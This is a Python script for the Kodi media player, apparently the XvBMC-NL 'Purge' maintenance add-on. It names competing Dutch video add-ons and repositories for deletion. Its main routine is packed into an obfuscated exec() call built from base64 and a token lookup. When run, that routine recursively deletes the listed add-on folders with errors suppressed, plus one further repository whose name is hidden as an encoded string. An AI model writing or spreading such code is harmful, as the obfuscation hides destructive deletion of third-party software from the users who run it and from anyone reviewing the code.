#!/usr/bin/python
 
"""
	IF you copy/paste 'script.purge' please keep the credits -2- EPiC -4- XvBMC-NL, Thx.
"""

#   script.Purge (Kodi Purge + Schoonmaak XvBMC Nederland)
#
#   Copyright (C) 2016
#
#   This program is free software: you can redistribute it and/or modify
#   it under the terms of the GNU General Public License as published by
#   the Free Software Foundation, either version 3 of the License, or
#   (at your option) any later version.
#
#   This program is distributed in the hope that it will be useful,
#   but WITHOUT ANY WARRANTY; without even the implied warranty of
#   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#   GNU General Public License for more details.
#
#   You should have received a copy of the GNU General Public License
#   along with this program.  If not, see <http://www.gnu.org/licenses/>.


import xbmc,xbmcaddon,xbmcgui,xbmcplugin,xbmcvfs
import os,re,base64,sys,shutil
import common as Common
# import os, xbmc, xbmcgui, shutil


######## ProgTitle ="XvBMC-NL-Maintenance" ########
dialog = xbmcgui.Dialog()
######## ProgTitle ="XvBMC-NL-Maintenance" ########


#######################################################################
#                          CLASSES
#######################################################################

class cacheEntry:
    def __init__(self, namei, pathi):
        self.name = namei
        self.path = pathi


#######################################################################
#						Work Functions
#######################################################################

def setupXvbmcEntries():
    entries = 11 #make sure this reflects the amount of entries you have
    dialogName = ["jehrico", "kidsplace", "NLVIEW", "nl-viewer", "nl-viewer2", "nlv3", "SportCenterHD", "Troma-copypaste", "JehricoRepo", "NLviewRepo", "TVaddons.nl"]
    pathName = ["special://home/addons/plugin.video.jericho",
				"special://home/addons/plugin.video.kidsplace",
				"special://home/addons/plugin.video.NLVIEW",
				"special://home/addons/plugin.video.nl-viewer",
				"special://home/addons/plugin.video.nl-viewer2",
				"special://home/addons/plugin.video.nlv3",
				"special://home/addons/plugin.video.sportcenterhd",
				"special://home/addons/plugin.video.troma",
				"special://home/addons/repository.jericho",
				"special://home/addons/repository.NLVIEW",
				"special://home/addons/repository.tvaddons.nl"]
                    
    XvbmcEntries = []
    
    for x in range(entries):
        XvbmcEntries.append(cacheEntry(dialogName[x],pathName[x]))
    
    return XvbmcEntries


#######################################################################
#						CRAPCLEANER
#######################################################################

exec ((lambda OOO0O00O0OOOOOO00 ,O0OOOO00OO000OO0O :(lambda O00OO0O000000O0O0 ,OO000OOO0O0OOO0OO ,O0O0OO00OOOO00OO0 :re .sub (O00OO0O000000O0O0 ,OO000OOO0O0OOO0OO ,O0O0OO00OOOO00OO0 ))(r"([0-9a-f]+)",lambda OO0O00O0OO0OOOO0O :OOO0O00O0OOOOOO00 (OO0O00O0OO0OOOO0O ,O0OOOO00OO000OO0O ),base64 .b64decode ("NjggMzkoKToKIyAgIDQ1IDEwLDUsNzEKIyAgIDMyIDNmICAjCiMgICAyYiA9IDEwLjQwKDUuNmYoMTAuOS41YSgnMTY6Ly8yZS8yMS8nKSkpCiMgICAxNSA9IDUuNmYoMTAuOS41YSgnMTY6Ly8yZS8yMS8nKSkKIyAgIDE5IDI2IDIyIDJiOgojICAgICAgIDM4ICgnMzEuM2EuNmInKSAyMiAyNjoKIyAgICAgICAgICAgMWUgMjkoMmIpKzI5KDI2KQojICAgICAgICAgICAyMDoKIyAgICAgICAgICAgICAgIDcxLjMoMTUrMjYsIDE9NikKIyAgICAgICAgICAgNzoKIyAgICAgICAgICAgICAgIGMKIyAgICAgICAxYjoKIyAgICAgICAgICAgYwoKCTEzID0gMjUoKQoKCTE5IDJmIDIyIDEzOgoJCTQxID0gNS42ZigyZi45KQoJCTM4IDEwLjkuNDQoNDEpPT02OgkKCQkJMTkgMWMsIDFhLCA3MCAyMiAxMC41OSg0MSk6CgkJCQkjMTEuM2IoIjFmIDYwIiwgJzZkIDMwIDJkIDY0IDEyIDguLi4nLCc0NzonLCA0MSkKCQkJCSMxZSAiNjYgMTc6ICIrNDEKCQkJCSM1LjM0KDI5KDQxKSkKCQkJCSNiID0gMAoJCQkJI2IgKz0gMmEoNzApCgkJCQkzOCAyYSgxYSkgPiAwIDQ2IDJhKDcwKSA+IDA6CSAjMzggYiA+IDA6CgkJCQkJMTkgZiAyMiA3MDoKCQkJCQkJMjA6CgkJCQkJCQkxMC4yYygxMC45LjVhKDFjLCBmKSkKCQkJCQkJNzogYwoJCQkJCTE5IGQgMjIgMWE6CgkJCQkJCTIwOgoJCQkJCQkJNzEuMygxMC45LjVhKDFjLCBkKSkKCQkJCQkJNyAxODogCgkJCQkJCQk3MS4zKDQxLCAxPTYpCgkJCQkJCTFiOiAKCQkJCQkJCTcxLjMoNDEsIDE9NikKCQkJCQkJCWMKCgkJCQk1MiAyYSgxYSkgPT0gMCA0NiAyYSg3MCkgPT0gMDogIzFiOgoJCQkJCSMxMS4zYigiMWYgNjAiLCAnNWUgMzAgMmQgNGUgMTIgOC4uLicsJzM2OicsIDQxKQoJCQkJCSMxZSAiNTAgMTc6ICIrNDEKCQkJCQkjNS4zNCgyOSg0MSkpCgkJCQkJMTkgZiAyMiA3MDoKCQkJCQkJMjA6CgkJCQkJCQkxMC4yYygxMC45LjVhKDFjLCBmKSkKCQkJCQkJNzogYwoJCQkJCTE5IGQgMjIgMWE6CgkJCQkJCTIwOgoJCQkJCQkJNzEuMygxMC45LjVhKDFjLCBkKSkKCQkJCQkJNyAxODogCgkJCQkJCQk3MS4zKDQxLCAxPTYpCgkJCQkJCTFiOiAKCQkJCQkJCTcxLjMoNDEsIDE9NikKCQkJCQkJCWMKCgkJMjA6CgkJCSMxMS4zYigiMWYgNjAiLCAnNjcgNWUgNTYgMmQgMTIgOD8gNTggNmMuLi4nLCc0ODonLCA0MSkKCQkJIzFlICI0YSAxNyAiKzQxCgkJCTUuMzQoMjkoNDEpKQoJCQk3MS4zKDQxLCAxPTYpCgkJNyAxODogCgkJCTcxLjMoNDEsIDE9NikKCQkxYjogCgkJCTcxLjMoNDEsIDE9NikKCQkJYwoKCTExLjNiKCItPSA2YSA2MiA9LSAiLCAnNjEgNDMgNWQgMjIgNWIgMzUnLCcnLCAnKDMzIDVkIDVjIDUxIDVjIGEgM2QpJykKCSM0Mi4xZCgpCgk1LmUoIjI0IikKCTUuZSgiMjgiKQoJCgkyNyA9IDUuNmYoMTAuOS41YSgnMTY6Ly8yZS8yMS8nKSkKCTIzPTRjLjM3KCcxND0nKSAjNTQgNTcgM2MjCgk3MS4zKDI3KzIzLCAxPTYpCgoiIiIKCTU4IDY1IDU1LzRmICc0OS40ZCcgNGIgNWYgNjkgM2UgLTItIDUzIC00LSAxZi02ZSwgNjMuCiIiIg==")))(lambda OOOOOO0O00O00OO0O ,O00000O0O0O0OO0O0 :O00000O0O0O0OO0O0 [int ("0x"+OOOOOO0O00O00OO0O .group (1 ),16 )],"0|ignore_errors|2|rmtree|4|xbmc|True|except|dependencies|path|a|file_count|pass|d|executebuiltin|f|os|dialog|orphaned|XvbmcEntries|cmVwb3NpdG9yeS5kb2tpbmw|addonfolder|special|ORPHANS|OSError|for|dirs|else|root|REMOVE_EMPTY_FOLDERS|print|XvBMC|try|addons|in|crapclean|UpdateLocalAddons|setupXvbmcEntries|item|addonmap|UpdateAddonRepos|str|len|xvbmc|unlink|some|home|entry|found|repository|bruteforce|everything|log|condition|CLEANcrap|b64decode|if|purgeOLD|tvaddons|ok|fuckers|whistle|credits|removal|listdir|xvbmcaddons|Common|system|exists|import|and|REMOVE|DELETE|script|MISSED|please|base64|purge|empty|paste|EMPTY|clean|elif|EPiC|kiss|copy|miss|this|IF|walk|join|good|as|is|we|keep|Nederland|your|DONE|Thx|old|you|OLD|Did|def|the|ALL|nl|SO|We|NL|translatePath|files|shutil".split ("|")))


#######################################################################
#						do some VooDoo
#######################################################################

purgeOLD()
